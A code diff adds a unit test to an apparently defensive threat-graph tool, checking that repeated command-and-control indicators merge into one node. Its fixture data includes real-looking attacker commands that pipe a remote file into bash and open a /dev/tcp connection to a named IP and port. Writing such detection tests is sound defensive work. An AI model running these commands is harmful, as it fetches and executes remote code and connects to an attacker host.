@@ -66,6 +66,21 @@ test("detects family and extracts IoCs (C2 + planted key) as nodes", () => {
   }
 })
 
+test("dedupes the same C2 host:port into a single node", () => {
+  const { nodes } = buildThreatGraph(
+    baseThreat({
+      classifiedCommands: [
+        { command: "curl -fsSL http://197.255.229.88:1987/fav.ico | bash", ts: "2026-06-15T10:00:00Z", category: "malware_drop" },
+        { command: "curl -k -s http://197.255.229.88:1987/fav.ico,timeout=15 | bash", ts: "2026-06-15T10:00:01Z", category: "malware_drop" },
+        { command: "bash -c exec 3 <> /dev/tcp/197.255.229.88/1987", ts: "2026-06-15T10:00:02Z", category: "malware_drop" },
+      ],
+    }),
+    null,
+  )
+  const c2 = nodes.filter((n) => n.data.kind === "ioc" && n.data.sub?.startsWith("C2"))
+  assert.equal(c2.length, 1, "the same C2 host:port must collapse to one node")
+})
+
 test("with enrichment, adds infra and reputation nodes", () => {
   const enrichment = {
     ip: "57.129.12.51",
